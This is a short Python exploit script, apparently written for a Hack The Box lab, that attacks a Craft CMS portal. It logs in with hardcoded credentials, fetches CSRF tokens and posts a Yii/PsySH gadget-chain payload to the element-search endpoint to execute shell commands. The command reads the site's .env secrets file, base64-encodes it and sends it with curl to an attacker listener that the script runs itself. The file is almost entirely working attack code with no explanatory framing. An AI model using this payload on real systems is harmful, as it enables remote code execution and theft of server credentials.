import base64,http.cookiejar,json,re,threading,urllib.parse,urllib.request as U
from http.server import BaseHTTPRequestHandler as BH,HTTPServer as HS
B="http://portal.international.htb";L="10.13.37.182";P=9998
class S(BH):
    def do_GET(s):
        print("REQ:",s.client_address[0],s.path,flush=True)
        d=urllib.parse.urlparse(s.path).path[1:]
        d=d.replace("_","/").replace("-","+")
        try:out=base64.b64decode(d+"="*(-len(d)%4)).decode(errors="replace")
        except Exception as ex:out="decode failed: %s"%ex
        print("OUT:",out,flush=True)
        s.send_response(200);s.end_headers()
    do_POST=do_GET
    def log_message(s,*a):pass
threading.Thread(target=lambda:HS(("0.0.0.0",P),S).serve_forever(),daemon=True).start()
o=U.build_opener(U.HTTPCookieProcessor(http.cookiejar.CookieJar()))
def GET(u,h=None):return o.open(U.Request(u,headers=h or {})).read().decode()
def POST(u,d,h=None):return o.open(U.Request(u,data=d,headers=h or {}))
t=re.search(r'CRAFT_CSRF_TOKEN" value="([^"]+)"',GET(B+"/admin/login")).group(1)
POST(B+"/admin/actions/users/login",urllib.parse.urlencode({"loginName":"jenny","password":"Fl1ghtDeck2026!","CRAFT_CSRF_TOKEN":t}).encode())
m=re.search(r'csrfTokenValue"\s*:\s*"([^"]+)"',GET(B+"/admin"))
if m:t=m.group(1)
e="craft\\elements\\Category";k="craft\\elements\\conditions\\ElementCondition"
cmd="/bin/bash -c \"curl -s http://%s:%d/$(cat /var/www/portal/.env|base64 -w0|tr '/+' '_-')\""%(L,P)
b={"as rce":{"__class":"yii\\behaviors\\AttributeTypecastBehavior","__construct()":[{"attributeTypes":{"typecastBeforeSave":["Psy\\Readline\\Hoa\\ConsoleProcessus","execute"]},"typecastBeforeSave":cmd}]},"on *":"self::beforeSave"}
p=json.dumps({"elementType":e,"siteId":1,"search":"","condition":{"class":k,"elementType":e,"fieldLayouts":[b]}}).encode()
H={"Content-Type":"application/json","Accept":"application/json","X-CSRF-Token":t,"X-Requested-With":"XMLHttpRequest","Referer":B+"/admin"}
try:r=POST(B+"/admin/actions/element-search/search",p,H);print("HTTP",r.status,flush=True)
except Exception as ex:
    print("PAYLOAD:",ex,flush=True)
    try:print("BODY:",ex.read().decode(errors="replace")[:600],flush=True)
    except Exception:pass
print("listening...",flush=True)
threading.Event().wait()
